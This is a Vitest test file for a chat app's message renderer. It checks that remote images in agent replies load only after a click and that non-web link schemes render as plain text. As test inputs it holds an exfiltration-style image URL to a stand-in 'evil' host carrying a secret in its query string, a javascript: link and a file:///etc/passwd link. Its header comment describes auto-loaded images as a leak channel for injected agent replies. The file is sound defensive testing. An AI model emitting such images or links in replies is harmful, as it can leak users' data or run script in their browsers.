// @vitest-environment happy-dom
/* AC tests for issue #566 — agent replies must not auto-load remote images
   (an auto-fetched URL is an exfiltration channel for an injected reply)
   and only https:/http:/mailto: links may stay links; every other scheme
   renders as plain text. data:/blob:/relative images (attachments) keep
   working. */
import { cleanup, fireEvent, render } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";
import { MessageResponse } from "../src/components/ai-elements/message";

/* happy-dom does not implement every browser API the vendored components touch. */
if (typeof globalThis.ResizeObserver === "undefined") {
  globalThis.ResizeObserver = class {
    observe() {}
    unobserve() {}
    disconnect() {}
  };
}
afterEach(cleanup);

const reply = (md: string) =>
  render(<MessageResponse className="lilos-prose">{md}</MessageResponse>);

const links = (c: HTMLElement) =>
  Array.from(
    c.querySelectorAll(
      'a[data-streamdown="link"], button[data-streamdown="link"]',
    ),
  );

describe("issue #566 — remote images load only on click", () => {
  test("AC-1 a remote https image renders a placeholder naming the host; no <img> in the DOM", () => {
    const { container } = reply(
      "Pulled it up: ![network map](https://img.evil.example/track.png?d=secret)",
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("img.evil.example");
  });

  test("AC-1 the placeholder swaps in the real <img> only after a click", () => {
    const { container, getByRole } = reply(
      "![network map](https://img.evil.example/track.png?d=secret)",
    );
    expect(container.querySelector("img")).toBeNull();
    fireEvent.click(getByRole("button"));
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe(
      "https://img.evil.example/track.png?d=secret",
    );
    expect(img?.getAttribute("alt")).toBe("network map");
  });

  test("AC-1 data:, blob: and relative images render immediately — attachments keep working", () => {
    const { container } = reply(
      "![chip](data:image/png;base64,iVBOR) ![b](blob:https://app/x-1) ![rel](/shots/local.png)",
    );
    const srcs = Array.from(container.querySelectorAll("img")).map((i) =>
      i.getAttribute("src"),
    );
    expect(srcs).toContain("data:image/png;base64,iVBOR");
    expect(srcs).toContain("blob:https://app/x-1");
    expect(srcs).toContain("/shots/local.png");
  });
});

describe("issue #566 — only web schemes stay links", () => {
  test("AC-1 javascript: and file: links render as plain text", () => {
    const { container } = reply(
      "See [the payload](javascript:alert(1)) and [open it](file:///etc/passwd).",
    );
    expect(links(container)).toHaveLength(0);
    expect(container.textContent).toContain("the payload");
    expect(container.textContent).toContain("open it");
  });

  test("AC-1 other non-web schemes (smb:, irc:, tel:) render as plain text", () => {
    const { container } = reply(
      "[share](smb://files.local/x) [chan](irc://chat.example/room) [call](tel:+15551234)",
    );
    expect(links(container)).toHaveLength(0);
    for (const label of ["share", "chan", "call"])
      expect(container.textContent).toContain(label);
  });

  test("AC-1 https: and mailto: links still render as links", () => {
    const { container } = reply(
      "[docs](https://lilos.dev/docs) and [mail ops](mailto:ops@lilos.dev)",
    );
    expect(links(container)).toHaveLength(2);
  });
});
